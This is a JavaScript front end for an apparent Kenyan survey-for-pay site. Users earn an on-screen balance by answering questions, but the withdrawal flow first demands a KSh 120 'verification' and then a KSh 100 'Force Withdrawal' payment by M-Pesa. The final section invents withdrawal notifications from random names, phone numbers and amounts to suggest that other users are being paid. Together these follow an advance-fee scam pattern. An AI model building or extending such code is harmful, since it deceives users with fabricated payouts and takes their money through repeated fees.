const API = 'https://kenyasurveysback.onrender.com/api';

// ════════════════════════════════════════════
// STATE
// ════════════════════════════════════════════
let token = localStorage.getItem('ks_token') || null;
let userProfile = null;
let currentPage = 0;
let totalPages = 20;
let stats = {
  balance: 0, totalEarned: 0, completedQuestions: 0,
  totalQuestions: 120, activated: false, forceVerified: false,
  activationPhone: "", transactions: []
};
let activationRef = null;
let activationPollTimer = null;
let forceVerifyPollTimer = null;

// ════════════════════════════════════════════
// INIT
// ════════════════════════════════════════════
window.addEventListener('DOMContentLoaded', () => {
  const nav = document.getElementById('lp-nav');
  if (nav) {
    window.addEventListener('scroll', () => {
      nav.style.boxShadow = window.scrollY > 10 ? '0 4px 24px rgba(0,0,0,0.45)' : 'none';
    });
  }
  if (token) {
    loadUser();
  } else {
    showHeroCta('guest');
  }
});

async function loadUser() {
  try {
    const data = await apiFetch('/auth/profile');
    userProfile = data;
    if (!data.profileComplete) {
      showScreen('profile-screen');
    } else {
      showHeroCta('user');
      showScreen('app-screen');
      await initApp();
    }
  } catch {
    token = null;
    localStorage.removeItem('ks_token');
    showHeroCta('guest');
    showScreen('landing-screen');
  }
}

async function initApp() {
  updateSidebarUser();
  await loadStats();
  loadQuestions(currentPage);
}

// ════════════════════════════════════════════
// HERO CTA
// ════════════════════════════════════════════
function showHeroCta(state) {
  const guest = document.getElementById('lp-hero-cta-guest');
  const user  = document.getElementById('lp-hero-cta-user');
  if (!guest || !user) return;
  if (state === 'user') {
    guest.classList.add('hidden');
    user.classList.remove('hidden');
  } else {
    guest.classList.remove('hidden');
    user.classList.add('hidden');
  }
}

// ════════════════════════════════════════════
// SCREENS
// ════════════════════════════════════════════
function showScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  window.scrollTo(0, 0);
}

function showPanel(name) {
  document.querySelectorAll('.page-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
  document.getElementById('panel-' + name).classList.add('active');
  const navEl = document.getElementById('nav-' + name);
  if (navEl) navEl.classList.add('active');
  closeSidebar();

  if (name === 'survey') loadQuestions(currentPage);

  if (name === 'withdraw') {
    document.getElementById('wd-locked').classList.add('hidden');
    document.getElementById('wd-force').classList.add('hidden');
    clearAlert(document.getElementById('wd-error'));
    clearAlert(document.getElementById('wd-success'));
    loadStats();
  }

  if (name === 'transactions') {
    renderAllTransactions();
  }
}

// ════════════════════════════════════════════
// LANDING HELPERS
// ════════════════════════════════════════════
function goToAuth(tab) {
  showScreen('auth-screen');
  switchTab(tab === 'login' ? 'login' : 'register');
}

function goToLanding() {
  showScreen('landing-screen');
}

function lpScrollTop() {
  if (document.getElementById('landing-screen').classList.contains('active')) {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  } else {
    showScreen('landing-screen');
  }
}

function lpScrollTo(id) {
  if (!document.getElementById('landing-screen').classList.contains('active')) {
    showScreen('landing-screen');
    setTimeout(() => {
      const el = document.getElementById(id);
      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 80);
  } else {
    const el = document.getElementById(id);
    if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }
}

function toggleLpMenu() {
  document.getElementById('lp-mobile-menu').classList.toggle('open');
}

function closeLpMenu() {
  const m = document.getElementById('lp-mobile-menu');
  if (m) m.classList.remove('open');
}

function toggleFaq(btn) {
  const answer = btn.nextElementSibling;
  const isOpen = answer.classList.contains('open');
  document.querySelectorAll('.lp-faq-a').forEach(a => a.classList.remove('open'));
  document.querySelectorAll('.lp-faq-q').forEach(b => b.classList.remove('open'));
  if (!isOpen) {
    answer.classList.add('open');
    btn.classList.add('open');
  }
}

// ════════════════════════════════════════════
// MODALS
// ════════════════════════════════════════════
function showModal(type) {
  document.getElementById('modal-overlay').classList.add('show');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
  document.getElementById('modal-' + type).classList.add('show');
}

function closeModal() {
  document.getElementById('modal-overlay').classList.remove('show');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
}

// ════════════════════════════════════════════
// AUTH
// ════════════════════════════════════════════
function switchTab(tab) {
  const isLogin = tab === 'login';
  document.getElementById('form-register').classList.toggle('hidden', isLogin);
  document.getElementById('form-login').classList.toggle('hidden', !isLogin);
  document.getElementById('tab-register').classList.toggle('active', !isLogin);
  document.getElementById('tab-login').classList.toggle('active', isLogin);
}

async function doRegister() {
  const phone = document.getElementById('reg-phone').value.trim();
  const pin   = document.getElementById('reg-pin').value.trim();
  const pin2  = document.getElementById('reg-pin2').value.trim();
  const errEl = document.getElementById('reg-error');
  const btn   = document.getElementById('btn-register');

  clearAlert(errEl);
  if (!phone || !pin || !pin2) { showAlert(errEl, 'All fields are required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    const data = await apiFetch('/auth/register', 'POST', { phone, pin, pin2 });
    token = data.token;
    localStorage.setItem('ks_token', token);
    toast('Account created!', 'success');
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    showScreen('profile-screen');
  } catch (err) {
    showAlert(errEl, err.message || 'Registration failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
  }
}

async function doLogin() {
  const phone = document.getElementById('login-phone').value.trim();
  const pin   = document.getElementById('login-pin').value.trim();
  const errEl = document.getElementById('login-error');
  const btn   = document.getElementById('btn-login');

  clearAlert(errEl);
  if (!phone || !pin) { showAlert(errEl, 'Phone and PIN required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    const data = await apiFetch('/auth/login', 'POST', { phone, pin });
    token = data.token;
    localStorage.setItem('ks_token', token);
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    if (!user.profileComplete) {
      showScreen('profile-screen');
    } else {
      showHeroCta('user');
      showScreen('app-screen');
      await initApp();
    }
  } catch (err) {
    showAlert(errEl, err.message || 'Login failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
  }
}

async function doCompleteProfile() {
  const name       = document.getElementById('prof-name').value.trim();
  const county     = document.getElementById('prof-county').value;
  const occupation = document.getElementById('prof-occupation').value;
  const education  = document.getElementById('prof-education').value;
  const errEl      = document.getElementById('prof-error');
  const succEl     = document.getElementById('prof-success');
  const btn        = document.getElementById('btn-profile');

  clearAlert(errEl); clearAlert(succEl);
  if (!name || !county || !occupation || !education) {
    showAlert(errEl, 'All fields are required.');
    return;
  }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    await apiFetch('/auth/profile/complete', 'POST', { name, county, occupation, education });
    showAlert(succEl, 'Profile saved! Redirecting to dashboard...');
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    setTimeout(async () => {
      showHeroCta('user');
      showScreen('app-screen');
      await initApp();
    }, 1200);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to save profile.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-check"></i> Save Profile and Continue';
  }
}

function doLogout() {
  token = null;
  userProfile = null;
  localStorage.removeItem('ks_token');
  showHeroCta('guest');
  showScreen('landing-screen');
}

// ════════════════════════════════════════════
// STATS & DASHBOARD
// ════════════════════════════════════════════
async function loadStats() {
  try {
    const data = await apiFetch('/survey/stats');
    stats = {
      ...data,
      completedIds:    data.completedIds    || [],
      forceVerified:   data.forceVerified   || false,
      activationPhone: data.activationPhone || "",
      transactions:    data.transactions    || []
    };
    updateDashboard();
    updateWithdrawPanel();
  } catch (err) {
    console.error('Failed to load stats:', err.message);
  }
}

function updateDashboard() {
  const bal       = (stats.balance || 0).toFixed(2);
  const earned    = (stats.totalEarned || 0).toFixed(2);
  const completed = stats.completedQuestions || 0;
  const total     = stats.totalQuestions || 120;
  const remaining = total - completed;
  const pct       = Math.round((completed / total) * 100);

  document.getElementById('sidebar-balance').textContent  = `KSh ${bal}`;
  document.getElementById('sidebar-earned').textContent   = `Total compensation: KSh ${earned}`;
  document.getElementById('mobile-balance').textContent   = `KSh ${bal}`;
  document.getElementById('stat-balance').textContent     = bal;
  document.getElementById('stat-earned').textContent      = earned;
  document.getElementById('stat-completed').textContent   = completed;
  document.getElementById('stat-remaining').textContent   = remaining;
  document.getElementById('progress-fill').style.width    = pct + '%';
  document.getElementById('progress-text').textContent    = `${completed} / ${total} completed`;
  document.getElementById('nav-survey-badge').textContent = remaining;

  const hour  = new Date().getHours();
  const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
  document.getElementById('dash-greeting').textContent =
    `${greet}, ${userProfile?.name || 'there'}!`;

  // ── Withdraw CTA widget ──
  const wctaTitle = document.getElementById('wcta-title');
  const wctaDesc  = document.getElementById('wcta-desc');
  const wctaBtn   = document.getElementById('wcta-btn');
  const dot1      = document.getElementById('wcta-dot-1');
  const dot2      = document.getElementById('wcta-dot-2');
  const dot3      = document.getElementById('wcta-dot-3');
  const step1     = document.getElementById('wcta-step-1');
  const step2     = document.getElementById('wcta-step-2');
  const step3     = document.getElementById('wcta-step-3');

  if (dot1 && dot2 && dot3) {
    if (!stats.activated) {
      dot1.className  = 'wcta-step-dot active';
      dot2.className  = 'wcta-step-dot pending';
      dot3.className  = 'wcta-step-dot pending';
      step1.className = 'wcta-step active';
      step2.className = 'wcta-step';
      step3.className = 'wcta-step';
      if (wctaTitle) wctaTitle.textContent = 'Withdraw Your Earnings';
      if (wctaDesc)  wctaDesc.textContent  = 'Complete a one-time KSh 120 account verification to activate M-Pesa withdrawals.';
      if (wctaBtn) {
        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account – KSh 120';
        wctaBtn.onclick   = () => showPanel('withdraw');
      }
    } else if (!stats.forceVerified) {
      dot1.className  = 'wcta-step-dot done';
      dot2.className  = 'wcta-step-dot active';
      dot3.className  = 'wcta-step-dot pending';
      step1.className = 'wcta-step done';
      step2.className = 'wcta-step active';
      step3.className = 'wcta-step';
      if (wctaTitle) wctaTitle.textContent = 'One Step Away from Withdrawal';
      if (wctaDesc)  wctaDesc.textContent  = 'Account verified. Complete the KSh 100 Force Withdrawal activation to enable payouts.';
      if (wctaBtn) {
        wctaBtn.innerHTML = '<i class="fas fa-link"></i> Force Withdrawal – KSh 100';
        wctaBtn.onclick   = () => showPanel('withdraw');
      }
    } else {
      dot1.className  = 'wcta-step-dot done';
      dot2.className  = 'wcta-step-dot done';
      dot3.className  = 'wcta-step-dot active';
      step1.className = 'wcta-step done';
      step2.className = 'wcta-step done';
      step3.className = 'wcta-step active';
      if (wctaTitle) wctaTitle.textContent = 'Ready to Withdraw';
      if (wctaDesc)  wctaDesc.textContent  = 'Your account is fully verified. Submit a payment request directly to your M-Pesa number.';
      if (wctaBtn) {
        wctaBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Withdraw Now';
        wctaBtn.onclick   = () => showPanel('withdraw');
      }
    }
  }

  renderDashTransactions();
}

function updateSidebarUser() {
  if (!userProfile) return;
  document.getElementById('sidebar-name').textContent  = userProfile.name || 'User';
  document.getElementById('sidebar-phone').textContent = '+' + (userProfile.phone || '');
}

function renderDashTransactions() {
  const el  = document.getElementById('dash-tx-list');
  const txs = (stats.transactions || []).slice(0, 6);
  if (!txs.length) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
    return;
  }
  el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
}

function renderAllTransactions() {
  const el  = document.getElementById('all-tx-list');
  const txs = stats.transactions || [];
  if (!txs.length) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
    return;
  }
  el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
}

function renderTxItem(tx) {
  const isPositive = tx.amount > 0;
  const type       = tx.type;
  let iconClass = 'earn', iconName = 'coins';
  if (type === 'withdrawal')                                  { iconClass = 'withdraw'; iconName = 'paper-plane'; }
  else if (type === 'welcome_bonus' || type === 'activation') { iconClass = 'bonus';    iconName = 'gift'; }

  const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', {
    day: 'numeric', month: 'short', year: 'numeric'
  });
  const amount = isPositive
    ? `+KSh ${tx.amount.toFixed(2)}`
    : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;

  return `<div class="tx-item">
    <div class="tx-icon ${iconClass}"><i class="fas fa-${iconName}"></i></div>
    <div>
      <div class="tx-desc">${tx.description}</div>
      <div class="tx-date">${date}</div>
    </div>
    <div class="tx-amount ${isPositive ? 'positive' : 'negative'}">${amount}</div>
  </div>`;
}

// ════════════════════════════════════════════
// SURVEY
// ════════════════════════════════════════════
async function loadQuestions(page) {
  const grid = document.getElementById('questions-grid');
  grid.innerHTML = '<div class="empty-state"><div class="spinner"></div></div>';
  try {
    const data = await apiFetch(`/survey/questions?page=${page}`);
    totalPages  = data.totalPages;
    currentPage = data.page;
    renderQuestions(data.questions);
    updatePagination();
    renderPageDots(data.totalPages);
  } catch {
    grid.innerHTML = '<div class="empty-state"><i class="fas fa-exclamation-circle"></i><p>Failed to load questions.</p></div>';
  }
}

function renderQuestions(questions) {
  const grid         = document.getElementById('questions-grid');
  const completedIds = stats.completedIds || [];

  grid.innerHTML = questions.map(q => {
    const isAnswered = completedIds.includes(q.id);
    return `<div class="question-card${isAnswered ? ' answered' : ''}" id="qcard-${q.id}" data-answered="${isAnswered}">
      <div class="question-meta">
        <span class="question-cat">${q.category}</span>
        <div style="display:flex;align-items:center;gap:8px;">
          ${isAnswered
            ? `<span class="question-answered-badge"><i class="fas fa-check-circle"></i> Completed</span>`
            : `<span class="question-reward"><i class="fas fa-coins"></i> KSh ${q.reward}</span>`
          }
        </div>
      </div>
      <div class="question-text">${q.question}</div>
      <div class="options-grid">
        ${q.options.map((opt, i) => `
          <button class="option-btn" id="opt-${q.id}-${i}"
            onclick="submitAnswer(${q.id}, ${i}, ${q.reward})"
            ${isAnswered ? 'disabled' : ''}>${opt}</button>
        `).join('')}
      </div>
      <div class="question-result" id="result-${q.id}">
        ${isAnswered
          ? `<span style="color:var(--text3);font-size:0.82rem;display:flex;align-items:center;gap:6px;margin-top:8px;">
               <i class="fas fa-lock" style="color:var(--green-dark)"></i> You have already completed this question
             </span>`
          : ''
        }
      </div>
    </div>`;
  }).join('');
}

async function submitAnswer(questionId, answerIndex, reward) {
  const card = document.getElementById('qcard-' + questionId);
  if (card.dataset.answered === 'true') return;

  for (let i = 0; i < 4; i++) {
    const btn = document.getElementById(`opt-${questionId}-${i}`);
    if (btn) btn.disabled = true;
  }

  const selectedBtn = document.getElementById(`opt-${questionId}-${answerIndex}`);
  if (selectedBtn) selectedBtn.style.opacity = '0.7';

  try {
    const data = await apiFetch('/survey/answer', 'POST', { questionId, answer: answerIndex });

    if (data.alreadyAnswered) {
      toast('You have already completed this question.', 'info');
      card.dataset.answered = 'true';
      return;
    }

    const correctBtn = document.getElementById(`opt-${questionId}-${data.correctIndex}`);
    if (correctBtn) correctBtn.classList.add('reveal-correct');

    const resultEl = document.getElementById('result-' + questionId);

    if (data.correct) {
      selectedBtn.classList.add('selected-correct');
      card.classList.add('correct');
      resultEl.className = 'question-result correct';
      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! Compensation of KSh ${data.earned} added.`;
      showEarnPop(data.earned);
      toast(`Correct! +KSh ${data.earned} compensation added.`, 'success');
    } else {
      selectedBtn.classList.add('selected-wrong');
      card.classList.add('wrong');
      resultEl.className = 'question-result wrong';
      resultEl.innerHTML = `<i class="fas fa-times-circle"></i> Incorrect. ${data.explanation || ''}`;
      toast('Incorrect answer. Keep going!', 'error');
    }

    card.dataset.answered = 'true';
    stats.balance = data.balance;
    stats.completedQuestions = (stats.completedQuestions || 0) + 1;
    if (data.correct) stats.totalEarned = (stats.totalEarned || 0) + data.earned;

    document.getElementById('sidebar-balance').textContent = `KSh ${data.balance.toFixed(2)}`;
    document.getElementById('mobile-balance').textContent  = `KSh ${data.balance.toFixed(2)}`;
    document.getElementById('stat-balance').textContent    = data.balance.toFixed(2);
    document.getElementById('wd-balance').textContent      = `KSh ${data.balance.toFixed(2)}`;

    loadStats();

  } catch (err) {
    toast(err.message || 'Failed to submit answer.', 'error');
    for (let i = 0; i < 4; i++) {
      const btn = document.getElementById(`opt-${questionId}-${i}`);
      if (btn) btn.disabled = false;
    }
  }
}

function changePage(dir) {
  const newPage = currentPage + dir;
  if (newPage < 0 || newPage >= totalPages) return;
  currentPage = newPage;
  loadQuestions(currentPage);
  window.scrollTo(0, 0);
}

function updatePagination() {
  document.getElementById('btn-prev').disabled = currentPage === 0;
  document.getElementById('btn-next').disabled = currentPage >= totalPages - 1;
  document.getElementById('page-info').textContent = `Page ${currentPage + 1} of ${totalPages}`;
  document.getElementById('btn-next').innerHTML = currentPage >= totalPages - 1
    ? '<i class="fas fa-flag-checkered"></i> Finish'
    : 'Next <i class="fas fa-arrow-right"></i>';
}

function renderPageDots(total) {
  const container = document.getElementById('page-dots');
  container.innerHTML = '';
  for (let i = 0; i < total; i++) {
    const dot = document.createElement('div');
    dot.className = 'page-dot' + (i === currentPage ? ' current' : '');
    dot.onclick = () => { currentPage = i; loadQuestions(i); };
    container.appendChild(dot);
  }
}

// ════════════════════════════════════════════
// PARTICIPANT COMPENSATION (WITHDRAW)
// ════════════════════════════════════════════
function formatPhoneDisplay(phone) {
  let ph = String(phone || '');
  if (ph.startsWith('254') && ph.length === 12) ph = '0' + ph.slice(3);
  return ph;
}

function updateWithdrawPanel() {
  const bal = (stats.balance || 0).toFixed(2);
  document.getElementById('wd-balance').textContent = `KSh ${bal}`;

  const maxWithdraw = Math.max(150, Math.min(Math.floor((stats.balance || 0) / 10) * 10, 10000));
  const slider = document.getElementById('wd-slider');
  if (slider) {
    slider.max = maxWithdraw;
    const sliderMax = document.getElementById('wd-slider-max');
    if (sliderMax) sliderMax.textContent = `KSh ${maxWithdraw.toLocaleString()}`;
    updateSlider();
  }

  const statusEl = document.getElementById('wd-status');
  const phoneRow = document.getElementById('wd-phone-row');
  const regPhone = document.getElementById('wd-reg-phone');

  if (phoneRow) phoneRow.classList.add('hidden');

  if (!stats.activated) {
    if (statusEl) statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
  } else if (!stats.forceVerified) {
    if (statusEl) statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Payout Activation Pending</span>';
    if (stats.activationPhone && phoneRow && regPhone) {
      phoneRow.classList.remove('hidden');
      regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
    }
  } else {
    if (statusEl) statusEl.innerHTML = '<span class="chip"><i class="fas fa-check"></i> Fully Verified</span>';
    if (stats.activationPhone && phoneRow && regPhone) {
      phoneRow.classList.remove('hidden');
      regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
    }
  }
}

function updateSlider() {
  const slider = document.getElementById('wd-slider');
  if (!slider) return;
  const val     = parseFloat(slider.value);
  const fee     = parseFloat((val * 0.04).toFixed(2));
  const receive = parseFloat((val - fee).toFixed(2));
  const display = document.getElementById('wd-amount-display');
  const receiveEl = document.getElementById('wd-receive');
  if (display)   display.textContent   = val;
  if (receiveEl) receiveEl.textContent = `KSh ${receive.toFixed(2)}`;
}

// ── Payment request submit ──
async function doWithdraw() {
  const phone  = document.getElementById('wd-phone').value.trim();
  const amount = parseFloat(document.getElementById('wd-slider').value);
  const errEl  = document.getElementById('wd-error');
  const succEl = document.getElementById('wd-success');
  const btn    = document.getElementById('btn-withdraw');

  clearAlert(errEl);
  clearAlert(succEl);

  document.getElementById('wd-locked').classList.add('hidden');
  document.getElementById('wd-force').classList.add('hidden');

  // ── Step 1: Basic validation ──
  if (!phone) {
    showAlert(errEl, 'Please enter a recipient M-Pesa number.');
    return;
  }

  if (isNaN(amount) || amount < 150) {
    showAlert(errEl, 'Minimum payment request is KSh 150.');
    return;
  }

  if (amount > (stats.balance || 0)) {
    showAlert(errEl, `Insufficient balance. Your available compensation is KSh ${(stats.balance || 0).toFixed(2)}.`);
    return;
  }

  // ── Step 2: Verification gates ──
  if (!stats.activated) {
    showAlert(errEl, 'Account verification required. Complete the one-time KSh 120 verification below to proceed.');
    document.getElementById('wd-locked').classList.remove('hidden');
    document.getElementById('wd-locked').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    return;
  }

  if (!stats.forceVerified) {
    showAlert(errEl, 'Payout channel activation required. Complete the KSh 100 Force Withdrawal below to proceed.');
    document.getElementById('wd-force').classList.remove('hidden');
    document.getElementById('wd-force').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    return;
  }

  // ── Step 3: Process ──
  const fee     = parseFloat((amount * 0.04).toFixed(2));
  const receive = parseFloat((amount - fee).toFixed(2));

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Processing...';

  try {
    const data = await apiFetch('/survey/withdraw', 'POST', { amount, mpesaPhone: phone });
    stats.balance = data.balance;
    updateDashboard();
    updateWithdrawPanel();
    showAlert(succEl, `Payment request of KSh ${amount} submitted. You will receive KSh ${receive} after the KSh ${fee} processing fee. Funds arrive within 24 hours.`);
    toast('Payment request submitted successfully!', 'success');
    document.getElementById('wd-phone').value = '';
    loadStats();
  } catch (err) {
    showAlert(errEl, err.message || 'Payment request failed. Please try again.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment Request';
  }
}

// ── Account Verification (KSh 120) ──
async function doActivate() {
  const phone  = document.getElementById('act-phone').value.trim();
  const errEl  = document.getElementById('act-error');
  const succEl = document.getElementById('act-success');
  const btn    = document.getElementById('btn-activate');

  clearAlert(errEl); clearAlert(succEl);
  if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending verification prompt...';

  try {
    const data = await apiFetch('/activation/initiate', 'POST', { phone });
    activationRef = data.reference;
    showAlert(succEl, 'M-Pesa prompt sent. Enter your PIN on your phone to complete verification.');
    toast('Check your phone for the M-Pesa verification prompt.', 'info');
    startActivationPoll(activationRef);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to send verification prompt.');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
  }
}

function startActivationPoll(ref) {
  if (activationPollTimer) clearInterval(activationPollTimer);
  let attempts = 0;
  const btn = document.getElementById('btn-activate');

  activationPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 30) {
      clearInterval(activationPollTimer);
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
      return;
    }
    try {
      const data = await apiFetch(`/activation/status/${ref}`);
      if (data.status === 'success') {
        clearInterval(activationPollTimer);
        await loadStats();
        document.getElementById('wd-locked').classList.add('hidden');
        document.getElementById('wd-force').classList.remove('hidden');
        document.getElementById('wd-force').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        toast('Account verified! Complete Force Withdrawal below to enable payouts.', 'success');
        btn.disabled = false;
      } else if (data.status === 'failed') {
        clearInterval(activationPollTimer);
        showAlert(document.getElementById('act-error'), 'Verification payment failed. Please try again.');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
      }
    } catch (err) {
      console.error('Poll error:', err.message);
    }
  }, 3000);
}

// ── Force Withdrawal (KSh 100) ──
async function doForceVerify() {
  const errEl  = document.getElementById('fv-error');
  const succEl = document.getElementById('fv-success');
  const btn    = document.getElementById('btn-force-verify');

  clearAlert(errEl); clearAlert(succEl);

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending prompt...';

  try {
    const data = await apiFetch('/activation/force/initiate', 'POST', {});
    const displayPhone = formatPhoneDisplay(data.phone);
    showAlert(succEl, `M-Pesa prompt sent to ${displayPhone}. Enter your PIN to complete payout channel activation.`);
    toast('Check your phone for the KSh 100 M-Pesa prompt.', 'info');
    startForceVerifyPoll(data.reference, btn);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to send prompt.');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
  }
}

function startForceVerifyPoll(ref, btn) {
  if (forceVerifyPollTimer) clearInterval(forceVerifyPollTimer);
  let attempts = 0;

  forceVerifyPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 30) {
      clearInterval(forceVerifyPollTimer);
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
      return;
    }
    try {
      const data = await apiFetch(`/activation/status/${ref}`);
      if (data.status === 'success') {
        clearInterval(forceVerifyPollTimer);
        await loadStats();
        document.getElementById('wd-force').classList.add('hidden');
        toast('Payout channel activated! You may now submit payment requests.', 'success');
        btn.disabled = false;
      } else if (data.status === 'failed') {
        clearInterval(forceVerifyPollTimer);
        showAlert(document.getElementById('fv-error'), 'Activation failed. Please try again.');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
      }
    } catch (err) {
      console.error('Poll error:', err.message);
    }
  }, 3000);
}

// ════════════════════════════════════════════
// SIDEBAR MOBILE
// ════════════════════════════════════════════
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
  document.getElementById('sidebar-overlay').classList.toggle('show');
}

function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('show');
}

// ════════════════════════════════════════════
// UTILITIES
// ════════════════════════════════════════════
async function apiFetch(path, method = 'GET', body = null) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
  if (body)  opts.body = JSON.stringify(body);
  const res  = await fetch(API + path, opts);
  const data = await res.json();
  if (!res.ok) throw new Error(data.message || 'Request failed');
  return data;
}

function showAlert(el, msg) {
  el.textContent = msg;
  el.classList.add('show');
}

function clearAlert(el) {
  el.textContent = '';
  el.classList.remove('show');
}

function toast(msg, type = 'info') {
  const container = document.getElementById('toast-container');
  const el        = document.createElement('div');
  el.className    = `toast ${type}`;
  const icons     = { success: 'check-circle', error: 'times-circle', info: 'info-circle' };
  el.innerHTML    = `<i class="fas fa-${icons[type] || 'info-circle'}"></i> ${msg}`;
  container.appendChild(el);
  setTimeout(() => {
    el.style.animation = 'slideOut 0.3s ease forwards';
    setTimeout(() => el.remove(), 300);
  }, 3500);
}

function showEarnPop(amount) {
  const pop = document.getElementById('earn-pop');
  document.getElementById('earn-amount').textContent = `+KSh ${amount}`;
  pop.classList.add('show');
  setTimeout(() => pop.classList.remove('show'), 1800);
}
// ════════════════════════════════════════════
// WITHDRAWAL NOTIFICATIONS
// ════════════════════════════════════════════
const NOTIF_NAMES = [
  'Amina','Baraka','Chebet','Dalila','Esther','Fatuma','Grace','Halima',
  'Imani','Joyce','Kendi','Lilian','Makena','Njeri','Otieno','Pendo',
  'Rehema','Saida','Tabitha','Uchenna','Violet','Wambui','Xolile','Zawadi',
  'Akinyi','Beatrice','Cynthia','Diana','Eunice','Florence','Gladys','Hellen',
  'Irene','Jacinta','Kemunto','Leah','Mercy','Nancy','Olive','Priscilla',
  'Rahel','Selina','Teresia','Upendo','Veronica','Wanjiku','Yusra','Zipporah',
  'Adhiambo','Boniface'
];

function randomPhone() {
  const prefixes = ['070','071','072','074','075','076','077','079','010','011'];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const mid    = Math.floor(Math.random() * 90 + 10);
  const end    = Math.floor(Math.random() * 90 + 10);
  return `${prefix}****${mid}${end}`;
}

function randomAmount() {
  const amounts = [550,600,650,700,750,800,850,900,950,1000,
                   1100,1200,1300,1400,1500,1600,1700,1800,1900,2000,
                   2200,2400,2500,2700,3000,3200,3500,3800,4000,4500,
                   5000,5500,6000,6500];
  return amounts[Math.floor(Math.random() * amounts.length)];
}

function timeAgo() {
  const mins = Math.floor(Math.random() * 9) + 1;
  return `${mins}m ago`;
}

function showWithdrawalNotif() {
  const container = document.getElementById('wd-notif-container');
  if (!container) return;

  const name   = NOTIF_NAMES[Math.floor(Math.random() * NOTIF_NAMES.length)];
  const phone  = randomPhone();
  const amount = randomAmount();
  const initials = name.slice(0, 2).toUpperCase();

  const notif = document.createElement('div');
  notif.className = 'wd-notif';
  notif.innerHTML = `
    <div class="wd-notif-avatar">${initials}</div>
    <div class="wd-notif-body">
      <div class="wd-notif-name">${name} ${phone}</div>
      <div class="wd-notif-amount">withdrew KSh ${amount.toLocaleString()}</div>
    </div>
    <div class="wd-notif-time">${timeAgo()}</div>
  `;

  container.appendChild(notif);

  // Max 3 visible at a time
  const all = container.querySelectorAll('.wd-notif');
  if (all.length > 3) {
    all[0].classList.add('hiding');
    setTimeout(() => all[0].remove(), 400);
  }

  // Auto remove after 4.5s
  setTimeout(() => {
    notif.classList.add('hiding');
    setTimeout(() => notif.remove(), 400);
  }, 4500);
}

// Start after 3s delay, then every 5s
setTimeout(() => {
  showWithdrawalNotif();
  setInterval(showWithdrawalNotif, 5000);
}, 3000);